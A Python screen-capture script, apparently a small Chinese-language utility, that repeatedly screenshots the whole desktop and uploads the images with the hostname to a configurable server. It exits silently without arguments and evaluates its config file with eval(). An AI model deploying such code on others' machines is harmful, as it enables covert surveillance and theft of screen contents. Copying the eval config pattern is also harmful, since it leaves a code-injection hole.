#导入库，需安装pyautogui,pillow,requests
import pyautogui,base64,socket,os,sys,datetime,time,requests
from sys import exit
from io import BytesIO
import tkinter as tk
from tkinter import messagebox
#保存设置
def saveSetting():
    if serviceStatInt.get():
        serviceStat = True
    else:
        serviceStat = False
    serverAddress = serverSet.get()
    time_wait = float(timeSet.get())
    if saveStatInt.get():
        saveStat = True
    else:
        saveStat = False
    dataWrite = {'service':serviceStat,'server':serverAddress,'time':time_wait,'save':saveStat}
    configF = open('config.ini','w+')
    configF.write(str(dataWrite))
    configF.close()
    messagebox.showwarning('修改成功','设置已保存，请重启程序以应用更改')
    exit()
#检查运行参数
try:
    if sys.argv[1] != 'set' and sys.argv[1] != 'run':
        exit()
except IndexError:
    exit()
#获取设置
if not os.path.exists('config.ini'):
    config = open('config.ini','w+')
    config.write("{'service':True,'server':'http://127.0.0.1:8000','time':10,'save':False}")
    config.close()
settings_file = open('config.ini','r')
settings = eval(settings_file.read())
service = settings['service']
server = settings['server']
time_stop = settings['time']
save_pic = settings['save']
if sys.argv[1] == 'set':
    #设置窗口
    window = tk.Tk()
    window.title('自动截屏上传工具 版本:1.0 本程序仅供学习和参考，请勿非法使用！')
    window.resizable(0,0)
    #提示信息
    tips = tk.Frame(window)
    serviceSwitchTip = tk.Label(tips,text='服务状态：')
    serviceSwitchTip.pack()
    serverSetTip = tk.Label(tips,text='服务器地址：')
    serverSetTip.pack()
    timeSetTip = tk.Label(tips,text='间隔时长（秒）：')
    timeSetTip.pack()
    saveSwitchTip = tk.Label(tips,text='保存至本地：')
    saveSwitchTip.pack()
    okBtn = tk.Button(tips,text='确定',command=saveSetting)
    okBtn.pack()
    tips.pack(side=tk.LEFT)
    #控制列表
    controls = tk.Frame(window)
    serviceStatInt = tk.IntVar()
    serviceSwitch = tk.Checkbutton(controls,variable=serviceStatInt)
    serviceSwitch.pack()
    if service:
        serviceSwitch.select()
    serverSet = tk.Entry(controls)
    serverSet.pack()
    serverSet.insert(0,server)
    timeSet = tk.Entry(controls)
    timeSet.pack()
    timeSet.insert(0,time_stop)
    saveStatInt = tk.IntVar()
    saveSwitch = tk.Checkbutton(controls,variable=saveStatInt)
    saveSwitch.pack()
    if save_pic:
        saveSwitch.select()
    cancelBtn = tk.Button(controls,text='取消',command=exit)
    cancelBtn.pack()
    controls.pack(side=tk.RIGHT)
    window.mainloop()
elif sys.argv[1] == 'run':
    if service:
        while True:
            #截屏
            img = pyautogui.screenshot()
            img_byte = BytesIO()
            date = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
            #保存图片
            if save_pic:
                if not os.path.exists('screenshots'):
                    os.mkdir('screenshots')
                img.save('screenshots/' + date + '.jpg')
            img.save(img_byte,format='jpeg')
            img_byte = img_byte.getvalue()
            img_data = base64.b64encode(img_byte).decode()
            #获取设备名
            hostname = socket.gethostname()
            host_data = base64.b64encode(hostname.encode()).decode()
            #对时间加密
            time_data = base64.b64encode(date.encode()).decode()
            #提交请求
            data = {'hostname':host_data,'screen':img_data,'time':time_data}
            try:
                requests.post(server + '/upload',data=data)
            except requests.exceptions.ConnectionError:
                time.sleep(time_stop)
                continue
            except OSError:
                time.sleep(time_stop)
                continue
            time.sleep(time_stop)